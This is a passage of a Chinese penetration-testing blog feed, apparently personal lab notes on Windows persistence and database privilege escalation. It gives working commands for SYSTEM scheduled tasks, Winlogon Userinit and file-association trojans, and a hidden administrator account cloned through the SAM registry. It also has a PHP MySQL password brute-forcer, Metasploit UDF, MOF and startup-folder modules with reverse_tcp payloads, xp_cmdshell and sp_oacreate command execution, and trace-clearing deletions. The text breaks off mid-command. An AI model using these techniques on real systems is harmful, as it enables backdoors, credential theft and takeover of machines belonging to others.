显示帮助信息</p></blockquote><p>命令</p><p><code>schtasks /create /sc minute /mo 1   /tn &quot;sd&quot; /tr C:\404.exe  /ru System</code></p><p>查看当前计划任务<br><code>schtasks /query</code></p><p>删除计划任务<br><code>Schtasks /delete /tn 任务名</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092db555754.png" alt="image-20240901182145401"></p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092db3dc7ed.png" alt="image-20240901182228430"></p><h3 id="Winlogon用户登录初始化"><a href="#Winlogon用户登录初始化" class="headerlink" title="Winlogon用户登录初始化"></a>Winlogon用户登录初始化</h3><p>winlogon是一个win的重要进程</p><p>在用户还没有登录之前就已经存在 </p><p>和登录 密码等相关</p><p>并且这个进程 是在杀软运行之前运行的</p><p>注册表路径</p><blockquote><p>HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon<br>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</p></blockquote><p>在winlogon里面有个userinit</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbca2d28.png" alt="image-20240901183316752"></p><p>本身默认是这样的</p><p><img src="https://bu.dusays.com/2024/10/11/67092db425551.png" alt="image-20240901183338512"></p><p>我们的木马需要放在这里面</p><p>这样就可以用户还没有登录就加载</p><p>但是不能这样</p><p><img src="https://bu.dusays.com/2024/10/11/67092db4f3131.png" alt="image-20240901183528362"></p><p>因为这个系统文件非常重要 改了系统会出问题</p><p>我们要这样</p><p><img src="https://bu.dusays.com/2024/10/11/67092db1bc287.png" alt="image-20240901183832037"></p><p>逗号然后跟我们的木马</p><p><img src="https://bu.dusays.com/2024/10/11/67092db422e8e.png" alt="image-20240901183933095"></p><p>上线</p><p>命令修改文件加载上线</p><p><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:\Windows\system32\userinit.exe,C:\404.exe&quot;</code></p><p>无文件落地：我们没有木马程序放到受害者主机上面</p><p>两种方式</p><ul><li>远程加载</li><li>powershell木马</li></ul><p>CS用powershell监听一下</p><p><img src="https://bu.dusays.com/2024/10/11/67092db275fb9.png" alt="image-20240901184238061"></p><p>然后一样的</p><p>把木马里面的东西拿过来 跟在后面</p><p><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:\Windows\system32\userinit.exe,这里替换生成的powershell&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092db08e82b.png" alt="image-20240901184526032"></p><p>注册表已经改了</p><p>重启 上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092db552068.png" alt="image-20240901184740376"></p><p>后台没有我们的木马</p><p>只要这个</p><p><img src="https://bu.dusays.com/2024/10/11/67092db1afdbd.png" alt="image-20240901184852289"></p><h3 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h3><p>将一个类型的文件和它可以打开的程序建立一个依赖程序关系</p><p>所以一个文件可以和多个程序进行关联</p><p><code>assoc .txt</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092db04a9f2.png" alt="image-20240901185518311"></p><p>可以看到</p><p>txt文件关联的是txtfile</p><p><code>ftype txtfile</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092db09c0db.png" alt="image-20240901185627922"></p><p>这个txtfile关联的是这个exe</p><p>我们把这个exe改成木马</p><p>那么他开txt文件就相当于开木马</p><p>改注册表</p><p><code>reg add &quot;HKEY_CLASSES_ROOT\txtfile\shell\open\command&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\404.exe %1&quot; /f</code></p><p>和映像劫持差不多</p><h3 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h3><p>屏保也是一个可执行程序</p><p><img src="https://bu.dusays.com/2024/10/11/67092db16cfb2.png" alt="image-20240901191353981"></p><p>这是三个值</p><p><img src="https://bu.dusays.com/2024/10/11/67092db1ae40a.png" alt="image-20240901191443764"></p><p>这是屏保的可执行程序</p><p>同理也就是加程序</p><p><img src="https://bu.dusays.com/2024/10/11/67092db170b45.png" alt="image-20240901191541781"></p><p>逗号 然后加木马</p><p>命令也差不多</p><p><code>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\Windows\system32\scrnsave.scr,C:\404.exe&quot; /f</code></p><h3 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h3><p>创建一个隐藏用户</p><p><code>net user test$ Aa.123456 /add</code></p><p>必须要加$ 不然就是普通用户</p><p>加入管理员组</p><p><code>net localgroup administrators test$ /add</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092db4f1c56.png" alt="image-20240901192049439"></p><p>可以看到</p><p>net user是看不到我们新建的影子用户的</p><p><img src="https://bu.dusays.com/2024/10/11/67092db97877e.png" alt="image-20240901192156570"></p><p>计算机管理还是看得见的</p><p>那么怎么让计算机管理也看不见呢</p><p>用户克隆</p><p><img src="https://bu.dusays.com/2024/10/11/67092db6b8a62.png" alt="image-20240901192349713"></p><p>本身注册表里的SAM我们是没有权限看的</p><p>改下权限</p><p><img src="https://bu.dusays.com/2024/10/11/67092db4a46f5.png" alt="image-20240901192502976"></p><p>再看</p><p><img src="https://bu.dusays.com/2024/10/11/67092db939b46.png" alt="image-20240901192527495"></p><p>有东西了</p><p>重启下注册表</p><p><img src="https://bu.dusays.com/2024/10/11/67092db824e83.png" alt="image-20240901192611453"></p><p>找到里面有用户的注册表项</p><p><img src="https://bu.dusays.com/2024/10/11/67092db7929d5.png" alt="image-20240901192640513"></p><p>先找到要克隆的用户的f值</p><p><img src="https://bu.dusays.com/2024/10/11/67092db8abc6a.png" alt="image-20240901192740530"></p><p>这里就是1f4</p><p>看到上面有1f4</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbdda7fc.png" alt="image-20240901192820637"></p><p>这就是administrator的</p><p>导出test$</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbd1b2c3.png" alt="image-20240901192919982"></p><p>还要导出test$和administrator的注册表项（1f4和3ea）</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbbba39c.png" alt="image-20240901193210438"></p><p>1–&gt;test$</p><p>2–&gt;3ea</p><p>3—&gt;1f4</p><p>打开23</p><p><img src="https://bu.dusays.com/2024/10/11/67092dc0b842a.png" alt="image-20240901193423984"></p><p>把if4(admin)的f值替换到3ea(test$)的f值</p><p>先把隐藏用户删了</p><p><code>net user test$ /del</code></p><p>然后导入12</p><p><code>regedit /s 1.reg</code></p><p><code>regedit /s 2.reg</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092dbc2251b.png" alt="image-20240901193915834"></p><p><img src="https://bu.dusays.com/2024/10/11/67092dbc6746a.png" alt="image-20240901194110511"></p><p>计算机管理已经看不到东西了</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbc22f82.png" alt="image-20240901194152690"></p><p>net也看不到</p><p>远程桌面连接</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbd0c5c9.png" alt="image-20240901194320377"></p><p>连接成且用户是administrator</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbbbef81.png" alt="image-20240901194427982"></p><p><code>reg export [导出的注册表键的完整路径] [导出到的文件的路径] [/y] reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EB C:\1.reg /y</code></p><p><a href="https://github.com/wgpsec/CreateHiddenAccount/blob/master/README_ZH.md">工具</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 维权 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库提权</title>
      <link href="/2024/10/11/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
      <url>/2024/10/11/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>如果内核提权没效果的情况下，采取数据库提权</p><p>前提条件：服务器开启数据库服务并且我们要获取到最高权限的用户密码</p><blockquote><p>账号</p><p>mysql：root</p><p>mssql：sa</p><p>Oracle：xxx</p></blockquote><h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><ul><li>SQL注入点–&gt;sqlmap     数据库就会存放最高权限用户的账密</li><li>数据库的存储文件或备份文件获取</li><li>网站应用的配置文件获取</li><li>工具、脚本爆破（需要解决外联问题）<ul><li>远程爆破</li><li>本地爆破</li></ul></li></ul><p>sqlmap就不打了</p><h4 id="数据库存放"><a href="#数据库存放" class="headerlink" title="数据库存放"></a>数据库存放</h4><p>我们先用哥斯拉连上靶机</p><p>生成木马</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbae0271.png" alt="image-20240824172053296"></p><p><img src="https://bu.dusays.com/2024/10/11/67092cbba324f.png" alt="image-20240824172231683"></p><p>把木马放到靶机上</p><p>哥斯拉连接一下</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbac4919.png" alt="image-20240824172410592"></p><p><img src="https://bu.dusays.com/2024/10/11/67092cbb514fc.png" alt="image-20240824172517682"></p><p><img src="https://bu.dusays.com/2024/10/11/67092cbb8412e.png" alt="image-20240824172650847"></p><p>进入</p><p>找到phpstudy中的data目录</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbf5f8c0.png" alt="image-20240824181418506"></p><p>data文件夹下就是mysql的表、库</p><p>每一个文件对应一个数据库</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbd4c53c.png" alt="image-20240824181637870"></p><p>进到mysql数据库中</p><p>.MYD文件中就存放了账号密码</p><p>找到</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbb16625.png" alt="image-20240824181752609"></p><p>打开</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbb21301.png" alt="image-20240824181810589"></p><p>password看的很清楚</p><p>mysql是通过md5加密的</p><p>解密一下</p><p><a href="cmd5.com">解密网站</a></p><p><img src="https://bu.dusays.com/2024/10/11/67092cbb514fc.png" alt="image-20240824182137937"></p><h4 id="存储文件与备份文件"><a href="#存储文件与备份文件" class="headerlink" title="存储文件与备份文件"></a>存储文件与备份文件</h4><p><img src="https://bu.dusays.com/2024/10/11/67092cbea3fb6.png" alt="image-20240824183617972"></p><p>配置文件中也存在</p><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><h5 id="远程爆破"><a href="#远程爆破" class="headerlink" title="远程爆破"></a>远程爆破</h5><p>爆破需要开启数据库外连</p><p>开启数据库外联命令：</p><blockquote><p>mysql&gt; use mysql; –打开数据库</p><p>mysql&gt; GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘root’ WITH GRANT OPTION;  –开启远程连接</p><p>mysql&gt; DELETE FROM user WHERE User&#x3D;”root” and Host&#x3D;”%”; </p><p>mysql&gt; flush privileges; –更新配置</p></blockquote><p>数据库管理</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbb4c277.png" alt="image-20240824184004888"></p><p>dbinfo-config</p><p>配置一下</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbbeb666.png" alt="image-20240824184404444"></p><p>开启外联</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbcac46c.png" alt="image-20240824184500760"></p><p>这样我们就可以用相应的外联工具进行远程连接</p><p>比如navicat</p><h5 id="本地爆破"><a href="#本地爆破" class="headerlink" title="本地爆破"></a>本地爆破</h5><p>脚本：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Mysql账号密码在线爆破工具&lt;/title&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">  &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;h1&gt;Mysql账号密码在线爆破工具 V2.<span class="number">0</span>&lt;/h1&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">  <span class="variable">$host</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$host</span>!==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">  <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名字典</span></span><br><span class="line">  <span class="variable">$password</span> = <span class="keyword">array</span>();</span><br><span class="line">  <span class="variable">$filename</span> = <span class="string">&quot;pwd.txt&quot;</span>; <span class="comment">//同目录下密码字典</span></span><br><span class="line">  <span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  <span class="keyword">while</span>(! <span class="title function_ invoke__">feof</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="variable">$password</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&lt;br&gt;-----------------------爆破状态-----------------------&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$l</span>=<span class="number">0</span>; <span class="variable">$l</span> &lt;= <span class="title function_ invoke__">count</span>(<span class="variable">$password</span>); <span class="variable">$l</span>++) &#123;</span><br><span class="line">    <span class="variable">$password1</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$password</span>[<span class="variable">$l</span>]);<span class="comment">//除去左右空白</span></span><br><span class="line">    <span class="keyword">if</span>(@<span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password1</span>))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;数据库密码为：<span class="subst">&#123;$password1&#125;</span>&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;font color=&#x27;red&#x27;&gt;爆破成功--密码--&gt;&quot;</span>.@<span class="variable">$password1</span>.<span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;----------------------爆破结束-----------------------&lt;br&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;黑客，输入数据库IP地址&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;Completion.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;<span class="comment">//这里要改成脚本名</span></span><br><span class="line">  数据库IP地址:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;host&quot;</span>/&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;爆破&quot;</span> name=<span class="string">&quot;submit&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们只需要改下字典地址就行</p><p>上传后浏览器访问一下</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbc570da.png" alt="image-20240824185325201"></p><p>127.0.0.1</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbb15c82.png" alt="image-20240824185707167"></p><p>成功</p><h3 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h3><h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>这个其实在sql注入的时候遇到过</p><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>UDF（Userdefined function）可翻译为用户自定义函数，其为mysql的一个拓展接口，可以为mysql增添一些函数。比如mysql一些函数没有，我就使用UDF加入一些函数进去，那么我就可以在mysql中使用这个函数了</p><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><h6 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h6><ul><li>获取mysql控制权限：知道mysql用户名和密码，并且可以远程登录（即获取了mysql数据库的权限）</li><li>mysql具有写入文件的权限：mysql有写入文件的权限，即secure_file_priv的值为空。</li></ul><p>可以查下有没有权限</p><p><code>show global variables like &#39;%secure%&#39;;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cbbbf11f.png" alt="image-20240824210505405"></p><p>为空–&gt;有权限</p><blockquote><p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出<br>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p></blockquote><p>如果secure_file_priv的值不是这个，我们可以在mysql&#x2F;my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv &#x3D; ‘ ‘ ，然后冲去apache服务即可生效。</p><h6 id="什么情况下需使用mysql提权？"><a href="#什么情况下需使用mysql提权？" class="headerlink" title="什么情况下需使用mysql提权？"></a>什么情况下需使用mysql提权？</h6><ul><li>拿到了mysql的权限，但是没拿到mysql所在服务器的任何权限，通过mysql提权，将mysql权限提升到操作系统权限</li></ul><p>注：mysql提权获取到的权限大小跟运行mysql所在服务器登录的账号的权限相关，如操作系统以普通用户登录的并启动mysql，经udf提权后也只能获取到系统的普通用户权限。而使用管理员登录操作系统运行mysql，提权后获取的权限则为系统管理员权限</p><h6 id="udf存放路径"><a href="#udf存放路径" class="headerlink" title="udf存放路径"></a>udf存放路径</h6><blockquote><p>mysql &lt;5.1    c:&#x2F;windows 或 system32</p><p>mysql&gt;&#x3D;5.1    &#x2F;lib&#x2F;plugin (mysql安装目录中)</p></blockquote><p>查看数据库版本</p><blockquote><p>select version();&#x2F;&#x2F;获取版本</p><p>select @@basedir;&#x2F;&#x2F;获取mysql安装目录 (如果集成环境搭建没有，就自己创建一个)</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092cbb5d90f.png" alt="image-20240824192730124"></p><h6 id="操作系统udf文件差异"><a href="#操作系统udf文件差异" class="headerlink" title="操作系统udf文件差异"></a>操作系统udf文件差异</h6><blockquote><p>linux：   .so<br>windows:  .dll</p></blockquote><h5 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h5><p>msf可以生成dll文件</p><p>这里用到一个新模块</p><p><code>use exploit/multi/mysql/mysql_udf_payload</code></p><p>进去后show options看一下</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc2ae1e5.png" alt="image-20240824194128709"></p><p>需要配置</p><p>rhost password username payload</p><p><code>set payload windows/meterpreter/reverse_tcp</code><br><code>set password root</code><br><code>set username root</code><br><code>set rhosts 192.168.10.199</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc4425d6.png" alt="image-20240824194735185"></p><p> 写入成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092cbfa4505.png" alt="image-20240824195334549"></p><p>现在我们就需要用到我们的navicat了</p><p><code>select * from mysql.func where name = &quot;sys_exec&quot;; //查看有没有开启sys_exec</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cbbb6e24.png" alt="image-20240824200011274"></p><p>现在 这个sys_exec函数已经与我们恶意udf绑定</p><p><code>create function sys_eval returns string soname &quot;faTmtVTW.dll&quot;;//创建函数绑定dll，dll的名字和查看的名字要一致</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cbb3acd0.png" alt="image-20240824200312376"></p><p>绑定成功</p><p>现在我们可以rce了</p><p><code>select sys_eval(&quot;whoami&quot;)</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc35abef.png" alt="image-20240824210038689"></p><h5 id="sqlmap生成dll"><a href="#sqlmap生成dll" class="headerlink" title="sqlmap生成dll"></a>sqlmap生成dll</h5><p>sqlmap也可以生成dll文件来提权</p><blockquote><p>sqlmap\data\udf\mysql\windows\32&#x2F;&#x2F;dll路径<br>sqlmap\extra\cloak&#x2F;&#x2F;解密模块路径<br>cloak.py -d -i 你的dll加密文件&#x2F;&#x2F;解密dll</p></blockquote><p>sqlmap–&gt;data–&gt;udf–&gt;mysql–&gt;windows–&gt;64–&gt;lib_mysaludf_sys.dll</p><p>这是一个加密了的恶意dll</p><p>现在我们要把它解密</p><p>sqlmap中内置了解密脚本</p><p>把这个文件放到</p><p>sqlmap–&gt;extra–&gt;cloak</p><p>这里面有个cloak.py脚本</p><p>cmd</p><p><code>python claok.py -d -i lib_mysqludf_sys.dll_</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc4926b0.png" alt="image-20240824230610664"></p><p>这个dll和我们msf生成的dll效果相同</p><p>我们把他放到目标的udf存放路径上</p><p>执行</p><p><code>create function sys_eval returns string soname &quot;lib_mysqludf_sys.dll&quot;;</code></p><p>绑定</p><p>在执行rce就行</p><h4 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h4><p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”<strong>托管对象格式</strong>“其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p><p>提权条件</p><blockquote><ul><li><p>要有写入权限</p></li><li><p>my.ini配置secure_file_priv  为空</p></li><li><p>开启外联</p></li><li><p>win2003及以前的一些版本</p></li></ul></blockquote><p>同样我们使用msf</p><p><code>use exploit/windows/mysql/mysql_mof</code></p><p>看下配置</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc2c65e9.png" alt="image-20240824234630139"></p><p>我们需要配置</p><p>password username rhost</p><p><code>set password root</code><br><code>set username root</code><br><code>set rhosts 192.168.0.123</code><br><code>run</code></p><p>我现在这个靶机是win2012 所以打不上去</p><p><img src="https://bu.dusays.com/2024/10/11/67092ccdb107a.png" alt="image-20240824234845512"></p><p>最后可以清理一下痕迹</p><blockquote><p>停止 winmgmt 服务</p><p>net stop winmgmt</p><p>删除 Repository 文件夹</p><p>rmdir &#x2F;s &#x2F;q C:\Windows\system32\wbem\Repository\</p><p>手动删除 mof 文件</p><p>del C:\Windows\system32\wbem\mof\good\test.mof &#x2F;F &#x2F;S</p><p>删除创建的用户</p><p>net user hacker &#x2F;delete</p><p>重新启动服务</p><p>net start winmgmt</p></blockquote><h4 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h4><h5 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h5><ul><li><p>要有写入权限</p></li><li><p>my.ini配置secure_file_priv  为空</p></li><li><p>开启外联</p></li></ul><p>因为要写木马 老样子了</p><h5 id="启动项路径"><a href="#启动项路径" class="headerlink" title="启动项路径"></a>启动项路径</h5><blockquote><p>#2003<br>C:\Documents and Settings\Administrator\Start Menu\Programs\Startup<br>C:\Documents and Settings\All Users\Start Menu\Programs\Startup<br>#2008<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup<br>#2012<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p></blockquote><p><strong>如果我们的文件放到这里面 那么在电脑重启后会自动调用system权限来执行这些文件</strong></p><h5 id="msf提权-1"><a href="#msf提权-1" class="headerlink" title="msf提权"></a>msf提权</h5><p>用这个模块</p><p><code>use exploit/windows/mysql/mysql_start_up</code></p><p>看下配置</p><p><img src="https://bu.dusays.com/2024/10/11/67092ccda52e3.png" alt="image-20240824235931487"></p><p>我们需要配置</p><p>password username rhosts AllowNoCleanup</p><p><code>set password root</code><br><code>set username root</code><br><code>set rhosts 192.168.0.123</code><br><code>set AllowNoCleanup true</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cccbe363.png" alt="image-20240825000152356"></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc985a70.png" alt="image-20240825000321883"></p><p>成功</p><p>现在我们只需要在msf上开启一个监听 一旦目标重启电脑 我们这边就直接上线</p><p>这里我们手动重启一下</p><p><img src="https://bu.dusays.com/2024/10/11/67092cccc55ed.png" alt="image-20240825001221041"></p><p>上线</p><p>注意这里端口是默认的4444</p><p>然后简单提权</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc640d5b.png" alt="image-20240825001144778"></p><p>成功</p><h3 id="SqlServer提权"><a href="#SqlServer提权" class="headerlink" title="SqlServer提权"></a>SqlServer提权</h3><p><strong>SQLServers是默认支持外联</strong></p><p>我的靶机是win2003</p><p>一样 先拿到webshell权限</p><p>一般使用iis + asp建立网站</p><p>iis查看网站根目录</p><p><img src="https://bu.dusays.com/2024/10/11/67092ccda0c40.png" alt="image-20240825002624140"></p><p>这样就可以打开网站根目录</p><p><img src="https://bu.dusays.com/2024/10/11/67092ccb85d1f.png" alt="image-20240825002649952"></p><p><strong>注意shell文件是asp的</strong></p><p><strong>82端口</strong></p><p>哥斯拉连接</p><p>找到配置文件</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc68224a.png" alt="image-20240825003005156"></p><p><img src="https://bu.dusays.com/2024/10/11/67092cca39c87.png" alt="image-20240825003028544"></p><h4 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h4><p>xp_cmdshell是mssql的一个开放接口  它可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出，是一个功能非常强大的扩展“存贮过程”。</p><p><strong>将命令字符串作为操作系统命令执行</strong></p><p>使用navicat</p><p>看下这个组件开没开</p><p><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cca39afc.png" alt="image-20240825003721629"></p><p>返回1 说明已启用</p><p>没有启用的话</p><p>可以用这条命名启用一下</p><p><code>EXEC sp_configure &#39;show advanced options&#39;, 1 RECONFIGURE EXEC sp_configure &#39;xp_cmdshell&#39;,1 RECONFIGURE</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc53e3db.png" alt="image-20240825003844282"></p><p>当然也可以关闭这个组件</p><p><code>EXEC sp_configure &#39;show advanced options&#39;, 1 RECONFIGURE EXEC sp_configure &#39;xp_cmdshell&#39;,0 RECONFIGURE</code></p><p>这个组件一旦启用 就可以执行命令</p><p><code>exec xp_cmdshell &quot;whoami&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc3a06dc.png" alt="image-20240825003958904"></p><p><code>EXEC master..xp_cmdshell &quot;whoami&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc8111b9.png" alt="image-20240825004303066"></p><p><code>EXEC master.dbo.xp_cmdshell &quot;ipconfig&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc97f95c.png" alt="image-20240825004344622"></p><p>这三种命令都可以执行</p><h4 id="sp-oacreate提权"><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权"></a>sp_oacreate提权</h4><p>跟xp_cmdshell差不多</p><p>系统存储过程 可以用于对于文件的一些操作 删除复制等</p><p>查看一下开没开这个服务</p><p><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;SP_OACREATE&#39;;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc7c9cdd.png" alt="image-20240825004845279"></p><p>返回1 表示已经启用</p><p>没有的话就启用一下</p><p><code>exec sp_configure &#39;show advanced options&#39;,1; reconfigure; exec sp_configure &#39;Ole Automation Procedures&#39;,1; reconfigure;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc5b837a.png" alt="image-20240825004941322"></p><p>写入文件 毕竟是操作文件的组件</p><p><code>declare @shell int exec sp_oacreate 